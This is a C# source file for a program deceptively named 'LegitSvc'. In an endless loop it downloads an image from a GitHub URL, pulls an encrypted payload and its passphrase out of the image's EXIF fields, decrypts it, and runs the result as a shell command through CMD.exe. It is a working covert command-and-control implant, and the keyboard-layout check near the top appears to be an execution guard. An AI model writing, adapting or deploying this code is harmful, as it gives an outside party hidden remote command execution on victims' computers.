using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal class LegitSvc {
    public static class StringCipher {
        private const int Keysize = 256;
        private const int DerivationIterations = 1000;

        public static string Encrypt(string plainText, string passPhrase) {
            byte[] array = Generate256BitsOfRandomEntropy();
            byte[] array2 = Generate256BitsOfRandomEntropy();
            byte[] bytes = Encoding.Default.GetBytes(plainText);
            using Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, array, 1000);
            byte[] bytes2 = rfc2898DeriveBytes.GetBytes(32);
            using RijndaelManaged rijndaelManaged = new RijndaelManaged();
            rijndaelManaged.BlockSize = 256;
            rijndaelManaged.Mode = CipherMode.CBC;
            rijndaelManaged.Padding = PaddingMode.PKCS7;
            using ICryptoTransform transform = rijndaelManaged.CreateEncryptor(bytes2, array2);
            using MemoryStream memoryStream = new MemoryStream();
            using CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
            cryptoStream.Write(bytes, 0, bytes.Length);
            cryptoStream.FlushFinalBlock();
            byte[] first = array;
            first = first.Concat(array2).ToArray();
            first = first.Concat(memoryStream.ToArray()).ToArray();
            memoryStream.Close();
            cryptoStream.Close();
            return Convert.ToBase64String(first);
        }

        public static string Decrypt(string cipherText, string passPhrase) {
            byte[] array = Convert.FromBase64String(cipherText);
            byte[] salt = array.Take(32).ToArray();
            byte[] rgbIV = array.Skip(32).Take(32).ToArray();
            byte[] buffer = array.Skip(64).Take(array.Length - 64).ToArray();
            using Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, salt, 1000);
            byte[] bytes = rfc2898DeriveBytes.GetBytes(32);
            using RijndaelManaged rijndaelManaged = new RijndaelManaged();
            rijndaelManaged.BlockSize = 256;
            rijndaelManaged.Mode = CipherMode.CBC;
            rijndaelManaged.Padding = PaddingMode.PKCS7;
            using ICryptoTransform transform = rijndaelManaged.CreateDecryptor(bytes, rgbIV);
            using MemoryStream stream = new MemoryStream(buffer);
            using CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read);
            using StreamReader streamReader = new StreamReader(stream2, Encoding.Default);
            return streamReader.ReadToEnd();
        }

        private static byte[] Generate256BitsOfRandomEntropy() {
            byte[] array = new byte[32];
            using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
            rNGCryptoServiceProvider.GetBytes(array);
            return array;
        }
    }

    private static void protect() {
        string layoutName = InputLanguage.CurrentInputLanguage.LayoutName;
        if (layoutName != "de-CH-pleasenorun") {
            Environment.Exit(0);
        }
    }

    private static void Main(string[] args) {
        protect();
        while (true) {
            Thread.Sleep(2000);
            using WebClient webClient = new WebClient();
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            byte[] buffer = webClient.DownloadData("https://raw.githubusercontent.com/00xNULL/meme_review/main/meme.jpg");
            using MemoryStream stream = new MemoryStream(buffer);
            using Image image = Image.FromStream(stream);
            PropertyItem[] propertyItems = image.PropertyItems;
            ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
            string @string = aSCIIEncoding.GetString(propertyItems[0].Value);
            string string2 = aSCIIEncoding.GetString(propertyItems[1].Value);
            @string = @string.Remove(@string.Length - 1);
            byte[] bytes = Convert.FromBase64String(@string);
            @string = Encoding.Default.GetString(bytes);
            string text = StringCipher.Decrypt(@string, string2);
            Process.Start("CMD.exe", "/C " + text + " && pause");
        }
    }
}

